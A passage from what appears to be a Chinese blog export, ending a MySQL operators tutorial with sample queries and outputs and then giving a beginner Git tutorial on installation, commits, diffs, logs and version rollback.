<p>8、BETWEEN<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 5 between 1 and 10;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| 5 between 1 and 10 |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">|                  1 |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure></p>
<p>9、IN<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 5 in (1,2,3,4,5);</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| 5 in (1,2,3,4,5) |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">|                1 |</span><br><span class="line">+<span class="comment">------------------+</span></span><br></pre></td></tr></table></figure></p>
<p>10、NOT IN<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 5 not in (1,2,3,4,5);</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| 5 not in (1,2,3,4,5) |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">|                    0 |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br></pre></td></tr></table></figure></p>
<p>11、IS NULL<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select null is NULL;</span><br><span class="line">+<span class="comment">--------------+</span></span><br><span class="line">| null is NULL |</span><br><span class="line">+<span class="comment">--------------+</span></span><br><span class="line">|            1 |</span><br><span class="line">+<span class="comment">--------------+</span></span><br><span class="line">mysql&gt; select 'a' is NULL;</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">| 'a' is NULL |</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">|           0 |</span><br><span class="line">+<span class="comment">-------------+</span></span><br></pre></td></tr></table></figure></p>
<p>12、IS NOT NULL<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select null IS NOT NULL;</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| null IS NOT NULL |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">|                0 |</span><br><span class="line">+<span class="comment">------------------+     </span></span><br><span class="line">mysql&gt; select 'a' IS NOT NULL;</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| 'a' IS NOT NULL |</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">|               1 |</span><br><span class="line">+<span class="comment">-----------------+</span></span><br></pre></td></tr></table></figure></p>
<p>13、LIKE<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select '12345' like '12%';</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| '12345' like '12%' |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">|                  1 |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">mysql&gt; select '12345' like '12_';</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| '12345' like '12_' |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">|                  0 |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure></p>
<p>14、REGEXP<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 'beijing' REGEXP 'jing';</span><br><span class="line">+<span class="comment">-------------------------+</span></span><br><span class="line">| 'beijing' REGEXP 'jing' |</span><br><span class="line">+<span class="comment">-------------------------+</span></span><br><span class="line">|                       1 |</span><br><span class="line">+<span class="comment">-------------------------+</span></span><br><span class="line">mysql&gt; select 'beijing' REGEXP 'xi';</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| 'beijing' REGEXP 'xi' |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">|                     0 |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br></pre></td></tr></table></figure></p>
<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。<br>运算符号    作用<br>NOT 或 !    逻辑非<br>AND    逻辑与<br>OR    逻辑或<br>XOR    逻辑异或<br>1、与<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 2 and 0;</span><br><span class="line">+<span class="comment">---------+</span></span><br><span class="line">| 2 and 0 |</span><br><span class="line">+<span class="comment">---------+</span></span><br><span class="line">|       0 |</span><br><span class="line">+<span class="comment">---------+    </span></span><br><span class="line">mysql&gt; select 2 and 1;   </span><br><span class="line">+<span class="comment">---------+     </span></span><br><span class="line">| 2 and 1 |      </span><br><span class="line">+<span class="comment">---------+      </span></span><br><span class="line">|       1 |      </span><br><span class="line">+<span class="comment">---------+</span></span><br></pre></td></tr></table></figure></p>
<p>2、或<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 2 or 0;</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">| 2 or 0 |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">|      1 |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">mysql&gt; select 2 or 1;</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">| 2 or 1 |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">|      1 |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">mysql&gt; select 0 or 0;</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">| 0 or 0 |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">|      0 |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">mysql&gt; select 1 || 0;</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">| 1 || 0 |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">|      1 |</span><br><span class="line">+<span class="comment">--------+</span></span><br></pre></td></tr></table></figure></p>
<p>3、非<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select not 1;</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| not 1 |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">|     0 |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">mysql&gt; select !0;</span><br><span class="line">+<span class="comment">----+</span></span><br><span class="line">| !0 |</span><br><span class="line">+<span class="comment">----+</span></span><br><span class="line">|  1 |</span><br><span class="line">+<span class="comment">----+</span></span><br></pre></td></tr></table></figure></p>
<p>4、异或<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 1 xor 1;</span><br><span class="line">+<span class="comment">---------+</span></span><br><span class="line">| 1 xor 1 |</span><br><span class="line">+<span class="comment">---------+</span></span><br><span class="line">|       0 |</span><br><span class="line">+<span class="comment">---------+</span></span><br><span class="line">mysql&gt; select 0 xor 0;</span><br><span class="line">+<span class="comment">---------+</span></span><br><span class="line">| 0 xor 0 |</span><br><span class="line">+<span class="comment">---------+</span></span><br><span class="line">|       0 |</span><br><span class="line">+<span class="comment">---------+</span></span><br><span class="line">mysql&gt; select 1 xor 0;</span><br><span class="line">+<span class="comment">---------+</span></span><br><span class="line">| 1 xor 0 |</span><br><span class="line">+<span class="comment">---------+</span></span><br><span class="line">|       1 |</span><br><span class="line">+<span class="comment">---------+</span></span><br><span class="line">mysql&gt; select null or 1;</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">| null or 1 |</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">|         1 |</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">mysql&gt; select 1 ^ 0;</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">| 1 ^ 0 |</span><br><span class="line">+<span class="comment">-------+</span></span><br><span class="line">|     1 |</span><br><span class="line">+<span class="comment">-------+</span></span><br></pre></td></tr></table></figure></p>
<h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>位运算符是在二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p>
<p>运算符号    作用<br>&amp;    按位与<br>|    按位或<br>^    按位异或<br>!    取反<br>&lt;&lt;    左移</p>
<blockquote>
<blockquote>
<p>   右移<br>1、按位与<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 3&amp;5;</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">| 3&amp;5 |</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">|   1 |</span><br><span class="line">+<span class="comment">-----+</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
</blockquote>
<p>2、按位或<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 3|5;</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">| 3|5 |</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">|   7 |</span><br><span class="line">+<span class="comment">-----+</span></span><br></pre></td></tr></table></figure></p>
<p>3、按位异或<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 3^5;</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">| 3^5 |</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">|   6 |</span><br><span class="line">+<span class="comment">-----+</span></span><br></pre></td></tr></table></figure></p>
<p>4、按位取反<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ~18446744073709551612;</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| ~18446744073709551612 |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">|                     3 |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br></pre></td></tr></table></figure></p>
<p>5、按位右移<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 3&gt;&gt;1;</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">| 3&gt;&gt;1 |</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">|    1 |</span><br><span class="line">+<span class="comment">------+</span></span><br></pre></td></tr></table></figure></p>
<p>6、按位左移<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 3&lt;&lt;1;</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">| 3&lt;&lt;1 |</span><br><span class="line">+<span class="comment">------+</span></span><br><span class="line">|    6 |</span><br><span class="line">+<span class="comment">------+</span></span><br></pre></td></tr></table></figure></p>
<p>运算符优先级<br>图略</p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>git教程</title>
    <url>/2019/07/18/git%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>参考：<br><a href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">git教程-廖雪峰的官方网站</a></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>git目前最先进的分布式版本控制系统。</p>
<a id="more"></a>
<h2 id="Git的诞生"><a href="#Git的诞生" class="headerlink" title="Git的诞生"></a>Git的诞生</h2><p>Linus为了更好地管理Linux系统的源码，花了两周时间自己用C写了一个分布式版本控制系统，也就是Git。</p>
<p>Git迅速成为最流行的分布式版本控制系统，尤其是2008年，GitHub网站上线了，它为开源项目免费提供Git存储，无数开源项目开始迁移至GitHub</p>
<h2 id="集中式vs分布式"><a href="#集中式vs分布式" class="headerlink" title="集中式vs分布式"></a>集中式vs分布式</h2><p>Linus一直痛恨的CVS及SVN都是集中式的版本控制系统，而Git是分布式版本控制系统，集中式和分布式版本控制系统有什么区别呢？</p>
<p>先说集中式版本控制系统，版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑，所以要先从中央服务器取得最新的版本，然后开始干活，干完活了，再把自己的活推送给中央服务器。</p>
<p>集中式版本控制系统最大的毛病就是必须联网才能工作，如果在局域网内还好，带宽够大，速度够快，可如果在互联网上，遇到网速慢的话，可能提交一个10M的文件就需要5分钟。</p>
<p>分布式版本控制系统根本没有“中央服务器”，每个人的电脑上都是一个完整的版本库，这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件A，你的同事也在他的电脑上改了文件A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。</p>
<p>和集中式版本控制系统相比，分布式版本控制系统的安全性要高很多，因为每个人电脑里都有完整的版本库，某一个人的电脑坏掉了不要紧，随便从其他人那里复制一个就可以了。而集中式版本控制系统的中央服务器要是出了问题，所有人都没法干活了。</p>
<p>分布式版本控制系统通常也有一台充当“中央服务器”的电脑，但这个服务器的作用仅仅是用来方便“交换”大家的修改，没有它大家也一样干活，只是交换修改不方便而已。</p>
<p>当然，Git的优势不单是不必联网这么简单，后面我们还会看到Git极其强大的分支管理，把SVN等远远抛在了后面。</p>
<h1 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h1><p>Git可以在Linux、Unix、Mac和Windows这几大平台运行。</p>
<h2 id="在Linux上安装Git"><a href="#在Linux上安装Git" class="headerlink" title="在Linux上安装Git"></a>在Linux上安装Git</h2><p>首先，你可以试着输入git，看看系统有没有安装Git：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git</span><br><span class="line">The program &apos;git&apos; is currently not installed. You can install it by typing:</span><br><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure></p>
<p>像上面的命令，有很多Linux会友好地告诉你Git没有安装，还会告诉你如何安装Git。</p>
<p>如果你碰巧用Debian或Ubuntu Linux，通过一条sudo apt-get install git就可以直接完成Git的安装，非常简单。</p>
<p>老一点的Debian或Ubuntu Linux，要把命令改为sudo apt-get install git-core，因为以前有个软件也叫GIT（GNU Interactive Tools），结果Git就只能叫git-core了。由于Git名气实在太大，后来就把GNU Interactive Tools改成gnuit，git-core正式改为git。</p>
<p>如果是其他Linux版本，可以直接通过源码安装。先从Git官网下载源码，然后解压，依次输入：./config，make，sudo make install这几个命令安装就好了。</p>
<h2 id="在Mac-OS-X上安装Git"><a href="#在Mac-OS-X上安装Git" class="headerlink" title="在Mac OS X上安装Git"></a>在Mac OS X上安装Git</h2><p>如果你正在使用Mac做开发，有两种安装Git的方法。</p>
<p>一是安装homebrew，然后通过homebrew安装Git，具体方法请参考homebrew的文档：<a href="http://brew.sh/。" target="_blank" rel="noopener">http://brew.sh/。</a></p>
<p>第二种方法更简单，也是推荐的方法，就是直接从AppStore安装Xcode，Xcode集成了Git，不过默认没有安装，你需要运行Xcode，选择菜单“Xcode”-&gt;“Preferences”，在弹出窗口中找到“Downloads”，选择“Command Line Tools”，点“Install”就可以完成安装了。</p>
<h2 id="在Windows上安装Git"><a href="#在Windows上安装Git" class="headerlink" title="在Windows上安装Git"></a>在Windows上安装Git</h2><p>在Windows上使用Git，可以从Git官网直接下载安装程序，（网速慢的同学请移步国内镜像），然后按默认选项安装即可。</p>
<p>安装完成后，在开始菜单里找到“Git”-&gt;“Git Bash”，蹦出一个类似命令行窗口的东西，就说明Git安装成功！</p>
<p>安装完成后，还需要最后一步设置，在命令行输入：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;email@example.com&quot;</span><br></pre></td></tr></table></figure></p>
<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。</p>
<p>注意git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
<h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><p>什么是版本库呢？版本库又名仓库，英文名repository，你可以简单理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。</p>
<p>所以，创建一个版本库非常简单，首先，选择一个合适的地方，创建一个空目录：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir learngit</span><br><span class="line">$ cd learngit</span><br><span class="line">$ pwd</span><br><span class="line">/Users/michael/learngit</span><br></pre></td></tr></table></figure></p>
<p>pwd命令用于显示当前目录。在我的Mac上，这个仓库位于/Users/michael/learngit。<br>如果你使用Windows系统，为了避免遇到各种莫名其妙的问题，请确保目录名（包括父目录）不包含中文。<br>第二步，通过git init命令把这个目录变成Git可以管理的仓库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git init</span><br><span class="line">Initialized empty Git repository in /Users/michael/learngit/.git/</span><br></pre></td></tr></table></figure></p>
<p>瞬间Git就把仓库建好了，而且告诉你是一个空的仓库（empty Git repository），细心的读者可以发现当前目录下多了一个.git的目录，这个目录是Git来跟踪管理版本库的，没事千万不要手动修改这个目录里面的文件，不然改乱了，就把Git仓库给破坏了。<br>如果你没有看到.git目录，那是因为这个目录默认是隐藏的，用ls -ah命令就可以看见。</p>
<h2 id="把文件添加到版本库"><a href="#把文件添加到版本库" class="headerlink" title="把文件添加到版本库"></a>把文件添加到版本库</h2><p>首先这里再明确一下，所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。</p>
<p>因为文本是有编码的，比如中文有常用的GBK编码，日文有Shift_JIS编码，如果没有历史遗留问题，强烈建议使用标准的UTF-8编码，所有语言使用同一种编码，既没有冲突，又被所有平台所支持。</p>
<p>使用Windows的童鞋要特别注意：</p>
<p>千万不要使用Windows自带的记事本编辑任何文本文件。原因是Microsoft开发记事本的团队在每个文件开头添加了0xefbbbf（十六进制）的字符，你会遇到很多不可思议的问题，比如，网页第一行可能会显示一个“?”，明明正确的程序一编译就报语法错误，等等。建议你下载Notepad++代替记事本，不但功能强大，而且免费！记得把Notepad++的默认编码设置为UTF-8 without BOM即可：</p>
<p>言归正传，现在我们编写一个readme.txt文件，内容如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a version control system.</span><br><span class="line">Git is free software.</span><br></pre></td></tr></table></figure></p>
<p>把一个文件放到Git仓库只需要两步。</p>
<p>第一步，用命令git add告诉Git，把文件添加到仓库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt</span><br></pre></td></tr></table></figure></p>
<p>执行上面的命令，没有任何显示，这就对了，Unix的哲学是“没有消息就是好消息”，说明添加成功。</p>
<p>第二步，用命令git commit告诉Git，把文件提交到仓库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;wrote a readme file&quot;</span><br><span class="line">[master (root-commit) eaadf4e] wrote a readme file</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br><span class="line"> create mode 100644 readme.txt</span><br></pre></td></tr></table></figure></p>
<p>简单解释一下git commit命令，-m后面输入的是本次提交的说明，可以输入任意内容，当然最好是有意义的，这样你就能从历史记录里方便地找到改动记录。</p>
<p>嫌麻烦不想输入-m “xxx”行不行？确实有办法可以这么干，但是强烈不建议你这么干，因为输入说明对自己对别人阅读都很重要。</p>
<p>git commit命令执行成功后会告诉你，1 file changed：1个文件被改动（我们新添加的readme.txt文件）；2 insertions：插入了两行内容（readme.txt有两行内容）。</p>
<p>为什么Git添加文件需要add，commit一共两步呢？因为commit可以一次提交很多文件，所以你可以多次add不同的文件，比如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add file1.txt</span><br><span class="line">$ git add file2.txt file3.txt</span><br><span class="line">$ git commit -m &quot;add 3 files.&quot;</span><br></pre></td></tr></table></figure></p>
<h1 id="时光机穿梭"><a href="#时光机穿梭" class="headerlink" title="时光机穿梭"></a>时光机穿梭</h1><p>我们已经成功地添加并提交了一个readme.txt文件，现在，是时候继续工作了，于是，我们继续修改readme.txt文件，改成如下内容：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software.</span><br></pre></td></tr></table></figure></p>
<p>现在，运行git status命令看看结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">	modified:   readme.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure></p>
<p>git status命令可以让我们时刻掌握仓库当前的状态，上面的命令输出告诉我们，readme.txt被修改过了，但还没有准备提交的修改。</p>
<p>虽然Git告诉我们readme.txt被修改了，但如果能看看具体修改了什么内容，自然是很好的。比如你休假两周从国外回来，第一天上班时，已经记不清上次怎么修改的readme.txt，所以，需要用git diff这个命令看看：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git diff readme.txt </span><br><span class="line">diff --git a/readme.txt b/readme.txt</span><br><span class="line">index 46d49bf..9247db6 100644</span><br><span class="line">--- a/readme.txt</span><br><span class="line">+++ b/readme.txt</span><br><span class="line">@@ -1,2 +1,2 @@</span><br><span class="line">-Git is a version control system.</span><br><span class="line">+Git is a distributed version control system.</span><br><span class="line"> Git is free software.</span><br></pre></td></tr></table></figure></p>
<p>git diff顾名思义就是查看difference，显示的格式正是Unix通用的diff格式，可以从上面的命令输出看到，我们在第一行添加了一个distributed单词。</p>
<p>知道了对readme.txt作了什么修改后，再把它提交到仓库就放心多了，提交修改和提交新文件是一样的两步，第一步是git add：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt</span><br></pre></td></tr></table></figure></p>
<p>同样没有任何输出。在执行第二步git commit之前，我们再运行git status看看当前仓库的状态：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">	modified:   readme.txt</span><br></pre></td></tr></table></figure></p>
<p>git status告诉我们，将要被提交的修改包括readme.txt，下一步，就可以放心地提交了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;add distributed&quot;</span><br><span class="line">[master e475afc] add distributed</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure></p>
<p>提交后，我们再用git status命令看看仓库的当前状态：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure></p>
<p>Git告诉我们当前没有需要提交的修改，而且，工作目录是干净（working tree clean）的。</p>
<h2 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h2><p>每当你觉得文件修改到一定程度的时候，就可以“保存一个快照”，这个快照在Git中被称为commit。一旦你把文件改乱了，或者误删了文件，还可以从最近的一个commit恢复，然后继续工作，而不是把几个月的工作成果全部丢失。</p>
<p>在Git中，我们用git log命令查看历史提交记录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log</span><br><span class="line">commit 1094adb7b9b3807259d8cb349e7df1d4d6477073 (HEAD -&gt; master)</span><br><span class="line">Author: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Fri May 18 21:06:15 2018 +0800</span><br><span class="line"></span><br><span class="line">    append GPL</span><br><span class="line"></span><br><span class="line">commit e475afc93c209a690c39c13a46716e8fa000c366</span><br><span class="line">Author: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Fri May 18 21:03:36 2018 +0800</span><br><span class="line"></span><br><span class="line">    add distributed</span><br><span class="line"></span><br><span class="line">commit eaadf4e385e865d25c48e7ca9c8395c3f7dfaef0</span><br><span class="line">Author: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Fri May 18 20:59:18 2018 +0800</span><br><span class="line"></span><br><span class="line">    wrote a readme file</span><br></pre></td></tr></table></figure></p>
<p>git log命令显示从最近到最远的提交日志<br>如果嫌输出信息太多，看得眼花缭乱的，可以试试加上–pretty=oneline参数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --pretty=oneline</span><br><span class="line">1094adb7b9b3807259d8cb349e7df1d4d6477073 (HEAD -&gt; master) append GPL</span><br><span class="line">e475afc93c209a690c39c13a46716e8fa000c366 add distributed</span><br><span class="line">eaadf4e385e865d25c48e7ca9c8395c3f7dfaef0 wrote a readme file</span><br></pre></td></tr></table></figure></p>
<p>Git的commit id不是1，2，3……递增的数字，而是一个SHA1计算出来的一个非常大的数字，用十六进制表示</p>
<p>每提交一个新版本，实际上Git就会把它们自动串成一条时间线。如果使用可视化工具查看Git历史，就可以更清楚地看到提交历史的时间线：</p>
<p>好了，现在我们启动时光穿梭机，准备把readme.txt回退到上一个版本，怎么做呢？</p>
<p>首先，Git必须知道当前版本是哪个版本，在Git中，用HEAD表示当前版本，也就是最新的提交1094adb…（注意我的提交ID和你的肯定不一样），上一个版本就是HEAD^，上上一个版本就是HEAD^^，当然往上100个版本写100个^比较容易数不过来，所以写成HEAD~100。</p>
<p>现在，我们要把当前版本append GPL回退到上一个版本add distributed，就可以使用git reset命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset --hard HEAD^</span><br><span class="line">HEAD is now at e475afc add distributed</span><br></pre></td></tr></table></figure></p>
<p>–hard参数有啥意义？这个后面再讲，现在你先放心使用。</p>
<p>看看readme.txt的内容是不是版本add distributed：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat readme.txt</span><br><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software.</span><br></pre></td></tr></table></figure></p>
<p>果然被还原了。</p>
<p>还可以继续回退到上一个版本wrote a readme file，不过且慢，然我们用git log再看看现在版本库的状态：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log</span><br><span class="line">commit e475afc93c209a690c39c13a46716e8fa000c366 (HEAD -&gt; master)</span><br><span class="line">Author: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Fri May 18 21:03:36 2018 +0800</span><br><span class="line"></span><br><span class="line">    add distributed</span><br><span class="line"></span><br><span class="line">commit eaadf4e385e865d25c48e7ca9c8395c3f7dfaef0</span><br><span class="line">Author: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Fri May 18 20:59:18 2018 +0800</span><br><span class="line"></span><br><span class="line">    wrote a readme file</span><br></pre></td></tr></table></figure></p>
<p>最新的那个版本append GPL已经看不到了！好比你从21世纪坐时光穿梭机来到了19世纪，想再回去已经回不去了，肿么办？</p>
<p>办法其实还是有的，只要上面的命令行窗口还没有被关掉，你就可以顺着往上找啊找啊，找到那个append GPL的commit id是1094adb…，于是就可以指定回到未来的某个版本：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset --hard 1094a</span><br><span class="line">HEAD is now at 83b0afe append GPL</span><br></pre></td></tr></table></figure></p>
<p>版本号没必要写全，前几位就可以了，Git会自动去找。当然也不能只写前一两位，因为Git可能会找到多个版本号，就无法确定是哪一个了。</p>
<p>再小心翼翼地看看readme.txt的内容：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat readme.txt</span><br><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br></pre></td></tr></table></figure></p>
<p>果然回来了。<br>Git的版本回退速度非常快，因为Git在内部有个指向当前版本的HEAD指针，当你回退版本的时候，Git仅仅是把HEAD从指向append GPL：<br><img src="https://mfaying.github.io/static/images/hbase/1.jpg" alt></p>
<p>然后顺便把工作区的文件更新了。所以你让HEAD指向哪个版本号，你就把当前版本定位在哪。</p>
<p>现在，你回退到了某个版本，关掉了电脑，第二天早上就后悔了，想恢复到新版本怎么办？</p>
<p>当你用$ git reset –hard HEAD^回退到add distributed版本时，再想恢复到append GPL，就必须找到append GPL的commit id。Git提供了一个命令git reflog用来记录你的每一次命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reflog</span><br><span class="line">e475afc HEAD@&#123;1&#125;: reset: moving to HEAD^</span><br><span class="line">1094adb (HEAD -&gt; master) HEAD@&#123;2&#125;: commit: append GPL</span><br><span class="line">e475afc HEAD@&#123;3&#125;: commit: add distributed</span><br><span class="line">eaadf4e HEAD@&#123;4&#125;: commit (initial): wrote a readme file</span><br></pre></td></tr></table></figure></p>
<h2 id="工作区和暂存区"><a href="#工作区和暂存区" class="headerlink" title="工作区和暂存区"></a>工作区和暂存区</h2><p>Git和其他版本控制系统如SVN的一个不同之处就是有暂存区的概念。</p>
<p>先来看名词解释。</p>
<p>工作区（Working Directory）</p>
<p>就是你在电脑里能看到的目录，比如我的learngit文件夹就是一个工作区</p>
<p>版本库（Repository）</p>
<p>工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库。</p>
